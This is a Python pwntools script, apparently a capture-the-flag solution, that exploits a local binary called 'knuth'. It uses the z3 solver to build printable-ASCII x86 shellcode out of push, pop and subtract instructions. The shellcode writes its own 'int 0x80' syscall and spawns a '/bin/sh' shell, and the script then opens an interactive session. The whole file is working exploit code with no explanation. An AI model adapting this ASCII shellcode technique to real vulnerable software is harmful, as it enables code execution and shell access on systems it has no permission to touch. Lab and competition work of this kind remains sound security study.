#!/usr/bin/env python2

from pwn import *
import z3

EXE_PATH = './knuth'
context.binary = EXE_PATH
e = ELF(EXE_PATH)

ESP_VAL = e.symbols['art_of_computer_programming'] + 66
SYSCALL_OPCODE = 0x80cd
NOPSLED = 0x49414941


# add constraint that all symbols must be ascii bytes
def add_ascii_dwords(syms, sr):
    for sym in syms:
        for i in range(4):
            byte = (sym >> (i * 8)) & 0xff
            sr.add(z3.And(0x20 <= byte, byte < 0x7f))


# use z3 to solve for a way to subtract to make the target value
def set_reg_way(target):
    num_syms = 1
    values = []
    while True:
        syms = [z3.BitVec(str(i), 32) for i in range(num_syms)]
        sr = z3.Solver()
        add_ascii_dwords(syms, sr)
        val = syms[0]
        for sym in syms[1:]:
            val -= sym
        sr.add(val == target)
        if sr.check() == z3.sat:
            m = sr.model()
            for sym in syms:
                values.append(int(str(m.evaluate(sym))))
            return values
        num_syms += 1


# set a register to a target value
# fix not efficient if the range is 0x00-0xff
def set_reg(reg, target):
    values = set_reg_way(target)
    s = ''
    s += 'push {}\n'.format(hex(values[0]))
    s += 'pop %{}\n'.format(reg)
    for value in values[1:]:
        s += 'sub %{}, {}\n'.format(reg, hex(value))
    return s


# set esp = ESP_VAL
def set_esp(clobber_reg):
    s = ''
    s += set_reg(clobber_reg, ESP_VAL)
    s += 'push %{}\n'.format(clobber_reg)
    s += 'pop %esp\n'
    return s


# eax = 0
def zero_eax():
    s = ''
    s += 'push 0x6a\n'
    s += 'pop %eax\n'
    s += 'xor %al, 0x6a\n'
    return s


# ascii execve("/bin/sh", NULL, NULL)
def make_shellcode():
    s = ''
    s += zero_eax()
    s += 'push %eax\n'
    s += 'push 0x68732f2f\n'
    s += 'push 0x6e69622f\n'
    s += 'push %esp\n'
    s += 'pop %ebx\n'  # ebx = "/bin/sh"
    s += 'push %eax\n'
    s += 'pop %ecx\n'  # ecx = 0
    s += 'push %eax\n'
    s += 'pop %edx\n'  # edx = 0
    # attempt to write `int 0x80` after eip
    s += set_esp('eax')
    s += set_reg('eax', SYSCALL_OPCODE)
    s += 'push %eax\n'
    # al = 0xb
    s += 'push 0x2b\n'
    s += 'pop %eax\n'
    s += 'xor %al, 0x20\n'
    # write nopsled
    s += 'push {}\n'.format(hex(NOPSLED))
    return s


def exploit():
    r = process(EXE_PATH)
    #gdb.attach(r)
    r.recvuntil("TeX\033[0m\n")
    s = asm(make_shellcode())
    assert len(s) <= 4096
    r.send(s)
    r.interactive()


if __name__ == '__main__':
    exploit()
